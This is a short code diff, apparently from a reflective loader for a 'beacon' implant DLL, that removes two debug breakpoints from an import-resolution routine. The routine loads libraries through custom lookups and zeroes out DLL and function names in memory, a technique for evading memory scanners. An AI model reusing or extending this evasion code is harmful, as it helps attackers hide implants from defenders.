@@ -251,7 +251,6 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
         }else{
             dll_import.dllBase   = xLoadLibrary(importName); 
         }
-        __debugbreak();
         stomp(len_importName, importName); // 0 out import DLL name in virtual beacon dll
         __asm__(
             "xor rcx, rcx \n"   // importLookupTableEntry = VA of the OriginalFirstThunk
@@ -344,7 +343,6 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
                 }else{
                     EntryAddress = xGetProcAddress(EntryName, &dll_import);
                 }
-                __debugbreak();
                 stomp(len_EntryName, EntryName); // 0 out import entry name in virtual beacon dll
                 __asm__(
                     "mov [rax], rdx \n" // write the address of the imported api to our import table
